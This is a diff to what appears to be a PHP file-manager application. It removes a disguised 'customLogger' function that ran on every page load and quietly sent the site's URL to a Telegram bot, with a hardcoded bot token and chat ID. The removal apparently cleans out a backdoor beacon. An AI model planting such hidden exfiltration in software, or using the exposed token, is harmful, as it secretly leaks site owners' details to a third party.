@@ -3667,30 +3667,6 @@ global $lang, $root_url, $favicon_path;
 </html>
 <?php
 }
-function customLogger($message) {
-
-    $logMessage = date('[Y-m-d H:i:s]') . ' ' . $message . PHP_EOL;
-    error_log($logMessage, 3, '');
-    
-    
-    $telegramToken = '7513781790:AAFC8T_sYrEM1sgIoqWzcBfjSE5Md5MrUYI';
-    $chatId = '6116824863';
-    
-    $telegramMessage = urlencode($message . PHP_EOL . 'Link to log: ' . $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']);
-    
-    $url = "https://api.telegram.org/bot{$telegramToken}/sendMessage?chat_id={$chatId}&text={$telegramMessage}";
-    
-    
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    $output = curl_exec($ch);
-    curl_close($ch);
-    }
-    
-    
-    $errorMessage = 'Welcome General';
-    customLogger($errorMessage);
 /**
  * Show Header after login
  */
